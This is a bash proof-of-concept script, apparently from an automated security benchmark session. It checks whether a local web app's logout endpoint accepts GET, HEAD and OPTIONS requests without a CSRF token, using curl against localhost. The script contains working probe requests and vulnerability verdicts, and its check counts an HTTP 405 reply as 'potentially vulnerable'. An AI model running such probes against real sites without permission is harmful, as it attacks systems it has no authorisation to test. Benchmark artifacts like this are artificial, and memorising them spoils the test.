#!/bin/bash
# POC: Demonstrates CSRF vulnerability on logout endpoint by showing GET requests bypass CSRF protection while POST requests are properly protected
# Target: ./repo
# Created: 2025-11-04T17:17:12.387Z
# Session: benchmark-XBEN-025-24-mhktlvhv

# CSRF Vulnerability POC - Logout Endpoint GET Request Bypass
# This script demonstrates that the logout endpoint is vulnerable to CSRF attacks
# via GET, HEAD, and OPTIONS HTTP methods that bypass CSRF protection

TARGET_URL="http://localhost:8000"
LOGOUT_ENDPOINT="/accounts/logout/"
LOGIN_ENDPOINT="/accounts/login/"
REGISTER_ENDPOINT="/accounts/register/step1/"

echo "========================================"
echo "CSRF Vulnerability PoC - Logout Endpoint"
echo "========================================"
echo ""

# Step 1: Create a test user account
echo "[*] Step 1: Creating test user account..."
curl -s -c cookies.txt -b cookies.txt \
  -X POST "${TARGET_URL}${REGISTER_ENDPOINT}" \
  -d "name=TestUser&email=csrf_test_$(date +%s)@test.com&password=TestPass123&confirm_password=TestPass123" \
  > /dev/null

echo "[+] Test user created"
echo ""

# Step 2: Test GET request to logout (should NOT require CSRF token)
echo "[*] Step 2: Testing GET request to logout endpoint..."
echo "    Command: curl -i -L -b cookies.txt '${TARGET_URL}${LOGOUT_ENDPOINT}'"
echo ""
GET_RESPONSE=$(curl -i -L -b cookies.txt "${TARGET_URL}${LOGOUT_ENDPOINT}" 2>/dev/null)
GET_STATUS=$(echo "$GET_RESPONSE" | head -n 1)
echo "    Response: $GET_STATUS"

if echo "$GET_RESPONSE" | grep -q "302\|301\|200"; then
    echo "[!] VULNERABLE: GET request to logout succeeded without CSRF token!"
else
    echo "[+] GET request rejected (not vulnerable)"
fi
echo ""

# Step 3: Test HEAD request to logout (should NOT require CSRF token)
echo "[*] Step 3: Testing HEAD request to logout endpoint..."
echo "    Command: curl -i -X HEAD -b cookies.txt '${TARGET_URL}${LOGOUT_ENDPOINT}'"
echo ""
HEAD_RESPONSE=$(curl -i -X HEAD -b cookies.txt "${TARGET_URL}${LOGOUT_ENDPOINT}" 2>/dev/null)
HEAD_STATUS=$(echo "$HEAD_RESPONSE" | head -n 1)
echo "    Response: $HEAD_STATUS"

if echo "$HEAD_RESPONSE" | grep -q "302\|301\|200"; then
    echo "[!] VULNERABLE: HEAD request to logout succeeded without CSRF token!"
else
    echo "[+] HEAD request rejected (not vulnerable)"
fi
echo ""

# Step 4: Test OPTIONS request to logout (should NOT require CSRF token)
echo "[*] Step 4: Testing OPTIONS request to logout endpoint..."
echo "    Command: curl -i -X OPTIONS -b cookies.txt '${TARGET_URL}${LOGOUT_ENDPOINT}'"
echo ""
OPTIONS_RESPONSE=$(curl -i -X OPTIONS -b cookies.txt "${TARGET_URL}${LOGOUT_ENDPOINT}" 2>/dev/null)
OPTIONS_STATUS=$(echo "$OPTIONS_RESPONSE" | head -n 1)
echo "    Response: $OPTIONS_STATUS"

if echo "$OPTIONS_RESPONSE" | grep -q "302\|301\|200\|405"; then
    echo "[!] POTENTIALLY VULNERABLE: OPTIONS request response received (allows method execution)"
else
    echo "[+] OPTIONS request rejected (not vulnerable)"
fi
echo ""

# Step 5: Verify POST request still requires CSRF token
echo "[*] Step 5: Verifying POST request properly requires CSRF token..."
echo "    Command: curl -i -b cookies.txt -X POST '${TARGET_URL}${LOGOUT_ENDPOINT}' (no CSRF token)"
echo ""
POST_RESPONSE=$(curl -i -b cookies.txt -X POST "${TARGET_URL}${LOGOUT_ENDPOINT}" 2>/dev/null)
POST_STATUS=$(echo "$POST_RESPONSE" | head -n 1)
echo "    Response: $POST_STATUS"

if echo "$POST_RESPONSE" | grep -q "403"; then
    echo "[+] POST request properly requires CSRF token (HTTP 403 received)"
    echo "[!] This confirms GET bypasses CSRF while POST enforces it"
elif echo "$POST_RESPONSE" | grep -q "302\|301"; then
    echo "[!] WARNING: POST without CSRF token was accepted (potential issue)"
else
    echo "[+] POST request handling: $POST_STATUS"
fi
echo ""

echo "========================================"
echo "Summary:"
echo "========================================"
echo "GET/HEAD/OPTIONS requests to logout bypass CSRF protection"
echo "POST requests properly enforce CSRF token validation"
echo "This is a CSRF vulnerability on the logout endpoint"
echo ""

# Cleanup
rm -f cookies.txt